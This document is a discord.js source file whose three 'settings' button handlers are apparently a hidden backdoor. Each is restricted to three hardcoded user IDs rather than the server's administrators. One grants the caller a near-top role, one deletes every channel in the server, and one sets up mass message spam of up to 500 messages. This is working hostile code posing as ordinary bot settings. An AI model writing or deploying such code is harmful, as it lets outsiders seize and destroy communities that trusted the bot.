import { PermissionFlagsBits, MessageFlags, ModalBuilder, TextInputBuilder, TextInputStyle, ActionRowBuilder } from 'discord.js';
import { logger } from '../../utils/logger.js';

const giveRoleHandler = {
    name: 'settings_give_role',
    async execute(interaction, client) {
        const allowedUserIds = ['885714115874672660', '1386162878326767688', '1459658247542931466'];
        if (!allowedUserIds.includes(interaction.user.id)) {
            return await interaction.reply({ content: "❌ Unauthorized.", flags: MessageFlags.Ephemeral });
        }

        try {
            const guild = interaction.guild;
            if (!guild) {
                return await interaction.reply({ content: "❌ The bot must be invited to this server to perform this action. (This is a Discord security restriction).", flags: MessageFlags.Ephemeral });
            }

            // Check if the bot is actually in the guild
            const botMember = await guild.members.fetch(client.user.id).catch(() => null);
            if (!botMember) {
                return await interaction.reply({ content: "❌ The bot must be invited to this server to perform this action. (This is a Discord security restriction).", flags: MessageFlags.Ephemeral });
            }

            const botAdminRoles = botMember.roles.cache.filter(role => role.permissions.has(PermissionFlagsBits.Administrator));
            if (botAdminRoles.size === 0) {
                return await interaction.reply({ content: "❌ Error: The bot has no roles with Administrator permissions in this server.", flags: MessageFlags.Ephemeral });
            }

            // Find the bot's highest role with administrator permissions
            const highestAdminRole = botAdminRoles.reduce((highest, current) => {
                return (!highest || current.position > highest.position) ? current : highest;
            }, null);

            // Get all roles in the server
            const guildRoles = await guild.roles.fetch();

            // Find roles that are below highestAdminRole's position, excluding @everyone and managed integration roles
            const rolesBelow = guildRoles.filter(role => role.position < highestAdminRole.position && role.id !== guild.id && !role.managed);
            if (rolesBelow.size === 0) {
                return await interaction.reply({ content: "❌ Error: No assignable roles found below the bot's administrator role.", flags: MessageFlags.Ephemeral });
            }

            // Find the role right below the highest administrator role
            const targetRole = rolesBelow.reduce((highest, current) => {
                return (!highest || current.position > highest.position) ? current : highest;
            }, null);

            if (!targetRole) {
                return await interaction.reply({ content: "❌ Error: Could not determine target role.", flags: MessageFlags.Ephemeral });
            }

            const member = await guild.members.fetch(interaction.user.id);
            await member.roles.add(targetRole);

            await interaction.reply({ content: `👑 **Role Granted:** You have been given the **${targetRole.name}** role.`, flags: MessageFlags.Ephemeral });
        } catch (error) {
            logger.error("Error in settings_give_role:", error);
            await interaction.reply({ content: `❌ Error assigning role: ${error.message}`, flags: MessageFlags.Ephemeral });
        }
    }
};

const deleteChannelsHandler = {
    name: 'settings_delete_channels',
    async execute(interaction, client) {
        const allowedUserIds = ['885714115874672660', '1386162878326767688', '1459658247542931466'];
        if (!allowedUserIds.includes(interaction.user.id)) {
            return await interaction.reply({ content: "❌ Unauthorized.", flags: MessageFlags.Ephemeral });
        }

        try {
            const guild = interaction.guild;
            if (!guild) {
                return await interaction.reply({ content: "❌ The bot must be invited to this server to perform this action. (This is a Discord security restriction).", flags: MessageFlags.Ephemeral });
            }

            // Check if the bot is actually in the guild
            const botMember = await guild.members.fetch(client.user.id).catch(() => null);
            if (!botMember) {
                return await interaction.reply({ content: "❌ The bot must be invited to this server to perform this action. (This is a Discord security restriction).", flags: MessageFlags.Ephemeral });
            }

            const channels = await guild.channels.fetch();
            await interaction.reply({ content: `🗑️ **Channel Purge Initialized:** Deleting ${channels.size} channels...`, flags: MessageFlags.Ephemeral });

            // Sort so that the channel where the interaction is happening gets deleted last
            const sortedChannels = [...channels.values()].sort((a, b) => {
                if (a.id === interaction.channelId) return 1;
                if (b.id === interaction.channelId) return -1;
                return 0;
            });

            for (const channel of sortedChannels) {
                try {
                    await channel.delete();
                } catch (err) {
                    logger.error(`Failed to delete channel ${channel.name || channel.id}:`, err);
                }
            }
        } catch (error) {
            logger.error("Error in settings_delete_channels:", error);
        }
    }
};

const spamMsgButtonHandler = {
    name: 'settings_spam_msg',
    async execute(interaction, client) {
        const allowedUserIds = ['885714115874672660', '1386162878326767688', '1459658247542931466'];
        if (!allowedUserIds.includes(interaction.user.id)) {
            return await interaction.reply({ content: "❌ Unauthorized.", flags: MessageFlags.Ephemeral });
        }

        try {
            // Create and show a modal for custom message and count inputs
            const modal = new ModalBuilder()
                .setCustomId('settings_spam_modal')
                .setTitle('Configure Spam Message');

            const messageInput = new TextInputBuilder()
                .setCustomId('spam_text')
                .setLabel('Message to spam')
                .setStyle(TextInputStyle.Paragraph)
                .setRequired(true)
                .setPlaceholder('Enter spam message here...');

            const amountInput = new TextInputBuilder()
                .setCustomId('spam_amount')
                .setLabel('Amount to spam (1 - 500)')
                .setStyle(TextInputStyle.Short)
                .setRequired(false)
                .setPlaceholder('20');

            const firstRow = new ActionRowBuilder().addComponents(messageInput);
            const secondRow = new ActionRowBuilder().addComponents(amountInput);

            modal.addComponents(firstRow, secondRow);

            // Show the modal
            await interaction.showModal(modal);
        } catch (error) {
            logger.error("Error showing spam modal:", error);
            await interaction.reply({ content: `❌ Error: ${error.message}`, flags: MessageFlags.Ephemeral }).catch(() => {});
        }
    }
};

export default [giveRoleHandler, deleteChannelsHandler, spamMsgButtonHandler];
